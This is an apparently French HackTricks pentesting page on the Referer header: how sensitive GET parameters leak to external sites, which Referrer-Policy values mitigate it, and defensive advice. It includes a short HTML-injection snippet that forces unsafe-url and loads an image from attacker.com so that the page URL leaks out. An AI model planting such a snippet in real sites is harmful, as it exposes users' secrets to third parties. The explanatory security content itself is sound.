<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

- Travaillez-vous dans une **entreprise de cybersécurité** ? Voulez-vous voir votre **entreprise annoncée dans HackTricks** ? ou voulez-vous avoir accès à la **dernière version de PEASS ou télécharger HackTricks en PDF** ? Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !

- Découvrez [**The PEASS Family**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)

- Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)

- **Rejoignez le** [**💬**](https://emojipedia.org/speech-balloon/) [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **Partagez vos astuces de piratage en soumettant des PR au [dépôt hacktricks](https://github.com/carlospolop/hacktricks) et au [dépôt hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.

</details>


# En-têtes de référence et politique

Le référent est l'en-tête utilisé par les navigateurs pour indiquer quelle était la page précédente visitée.

## Fuite d'informations sensibles

Si à un moment donné à l'intérieur d'une page web, des informations sensibles sont situées dans les paramètres d'une requête GET, si la page contient des liens vers des sources externes ou si un attaquant est capable de faire/suggérer (ingénierie sociale) à l'utilisateur de visiter une URL contrôlée par l'attaquant. Il pourrait être capable d'exfiltrer les informations sensibles à l'intérieur de la dernière requête GET.

## Atténuation

Vous pouvez faire en sorte que le navigateur suive une **politique de référence** qui pourrait **éviter** que les informations sensibles ne soient envoyées à d'autres applications web :
```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```
## Contre-mesure

Vous pouvez outrepasser cette règle en utilisant une balise méta HTML (l'attaquant doit exploiter une injection HTML) :
```markup
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```
## Défense

Ne jamais mettre de données sensibles dans les paramètres GET ou les chemins de l'URL.
